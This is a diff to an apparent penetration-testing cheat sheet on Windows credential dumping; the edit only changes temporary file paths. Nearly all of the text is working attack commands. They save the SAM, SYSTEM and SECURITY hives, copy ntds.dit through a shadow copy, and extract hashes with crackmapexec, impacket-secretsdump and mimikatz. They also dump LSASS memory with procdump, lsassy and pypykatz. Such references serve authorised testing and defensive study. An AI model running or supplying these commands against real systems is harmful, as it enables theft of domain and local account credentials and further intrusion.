@@ -1,7 +1,7 @@
 # Credentials Dumping
 Uses the boot key to decrypt useful files:
 ```bash
-reg SAVE HKLM\SYSTEM C:\Windows\Temp\SYSTEM
+reg SAVE HKLM\SYSTEM %SystemRoot%\Temp\SYSTEM
 ```
 
 ## NTDS.DIT
@@ -10,7 +10,7 @@ All domain account hashes & kerberos keys. The database is stored on the DC loca
 crackmapexec smb <IP> -d '<DOMAIN>' -u '<USER>' -p '<PASS>' --ntds
 
 vssadmin create shadow /for=C:
-copy <VOLUME_NAME>\Windows\NTDS\ntds.dit C:\Windows\Temp\NTDS
+copy <VOLUME_NAME>\Windows\NTDS\ntds.dit %SystemRoot%\Temp\NTDS
 vssadmin delete shadows /shadow=<ID>
 impacket-secretsdump -ntds <NTDS> -system <SYSTEM> LOCAL
 
@@ -22,7 +22,7 @@ Security Account Manager (SAM) database contains all NTLM hashes for local accou
 ```bash
 crackmapexec smb <IP> -d '<DOMAIN>' -u '<USER>' -p '<PASS>' --sam
 
-reg SAVE HKLM\SAM C:\Windows\Temp\SAM
+reg SAVE HKLM\SAM %SystemRoot%\Temp\SAM
 impacket-secretsdump -sam <SAM> -system <SYSTEM> LOCAL
 token::elevate lsadump::sam /system:<SYSTEM> /SAM:<SAM>
 
@@ -34,7 +34,7 @@ Local Security Authority (LSA) contains cached secrets and keys, stored at `HKLM
 ```bash
 crackmapexec smb <IP> -d '<DOMAIN>' -u '<USER>' -p '<PASS>' --lsa
 
-reg SAVE HKLM\SECURITY C:\Windows\Temp\SECURITY
+reg SAVE HKLM\SECURITY %SystemRoot%\Temp\SECURITY
 impacket-secretsdump -security <SECURITY> -system <SYSTEM> LOCAL
 
 token::elevate lsadump::cache
@@ -49,7 +49,7 @@ crackmapexec smb <IP> -d '<DOMAIN>' -u '<USER>' -p '<PASS>' -M lsassy
 lsassy -d '<DOMAIN>' -u '<USER>' -p '<PASS>' <IP>
 
 tasklist /fi "imagename eq lsass.exe"
-procdump.exe -accepteula -ma <PID> C:\\Windows\\Temp\\lsass.dmp
+procdump.exe -accepteula -ma <PID> %SystemRoot%\Temp\lsass.dmp
 pypykatz lsa minidump lsass.dmp
 
 sekurlsa::logonPasswords
